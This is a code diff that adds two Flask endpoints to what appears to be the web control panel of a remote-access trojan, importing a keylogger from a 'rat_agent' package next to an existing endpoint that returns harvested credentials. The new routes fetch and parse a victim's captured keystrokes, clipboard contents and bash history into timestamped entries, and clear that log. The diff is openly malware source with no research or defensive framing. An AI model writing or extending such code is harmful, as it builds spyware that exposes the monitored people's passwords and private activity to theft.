@@ -271,6 +271,83 @@ def api_get_credentials():
     creds = get_credentials()
     return jsonify(creds)
 
+@app.route('/api/keylog', methods=['GET'])
+@login_required
+def api_get_keylog():
+    """Get keylog data with timestamps"""
+    try:
+        from rat_agent.keylogger import Keylogger
+        config = Config()
+        keylogger = Keylogger(config)
+        
+        lines = request.args.get('lines', 200, type=int)
+        keylog_data = keylogger.get_keylog(lines)
+        
+        # Parse keylog into structured format
+        entries = []
+        current_timestamp = None
+        current_text = ""
+        
+        for line in keylog_data.split('\n'):
+            # Check for timestamp pattern
+            import re
+            timestamp_match = re.search(r'\[(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}\.\d{3})\]', line)
+            clipboard_match = re.search(r'\[(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})\] === (CLIPBOARD|BASH HISTORY) ===', line)
+            
+            if clipboard_match:
+                timestamp = clipboard_match.group(1)
+                source = clipboard_match.group(2)
+                entries.append({
+                    'timestamp': timestamp,
+                    'type': source,
+                    'text': '',
+                    'source': source.lower().replace(' ', '_')
+                })
+            elif timestamp_match:
+                if current_text:
+                    entries.append({
+                        'timestamp': current_timestamp or 'Unknown',
+                        'type': 'keystroke',
+                        'text': current_text,
+                        'source': 'keyboard'
+                    })
+                current_timestamp = timestamp_match.group(1)
+                current_text = line.replace(f'[{current_timestamp}]', '').strip()
+            else:
+                if line.strip():
+                    current_text += ' ' + line.strip() if current_text else line.strip()
+        
+        # Add last entry
+        if current_text:
+            entries.append({
+                'timestamp': current_timestamp or 'Unknown',
+                'type': 'keystroke',
+                'text': current_text,
+                'source': 'keyboard'
+            })
+        
+        # Get raw keylog for full view
+        return jsonify({
+            'entries': entries[-100:],  # Last 100 entries
+            'raw': keylog_data[-5000:],  # Last 5000 chars
+            'total_chars': len(keylog_data)
+        })
+    except Exception as e:
+        return jsonify({'error': str(e), 'entries': [], 'raw': '', 'total_chars': 0}), 500
+
+@app.route('/api/keylog/clear', methods=['POST'])
+@login_required
+def api_clear_keylog():
+    """Clear keylog data"""
+    try:
+        from rat_agent.keylogger import Keylogger
+        config = Config()
+        keylogger = Keylogger(config)
+        keylogger.clear_keylog()
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
 @app.route('/api/cleanup', methods=['POST'])
 @login_required
 def api_cleanup():
